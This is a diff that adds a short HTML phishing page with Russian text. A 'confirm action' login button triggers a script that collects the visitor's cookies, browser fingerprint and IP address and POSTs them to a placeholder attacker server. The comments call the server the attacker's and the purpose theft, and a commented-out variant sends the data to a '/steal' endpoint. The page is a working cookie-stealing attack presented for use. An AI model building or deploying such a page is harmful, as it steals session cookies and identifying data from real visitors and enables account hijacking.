@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Перейти по ссылке</title>
+</head>
+<body>
+    <h1>Подтвердите действие</h1>
+    <button onclick="collectAndSend()">Нажмите для входа</button>
+
+    <script>
+        async function collectAndSend() {
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                cookies: document.cookie
+            };
+
+            // Получаем IP через сторонний бесплатный сервис (необходим для полной кражи)
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (e) {
+                data.ip = 'Не удалось определить IP';
+            }
+
+            // Отправляем данные на сервер злоумышленника (Flask)
+            fetch('http://IP_вашего_сервера:5000/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.error('Ошибка отправки', err));
+
+            // Или через GET (если сервер принимает в URL)
+            // const url = 'http://IP_вашего_сервера:5000/steal?data=' + encodeURIComponent(JSON.stringify(data));
+            // window.open(url, '_blank');
+        }
+    </script>
+</body>
+</html>
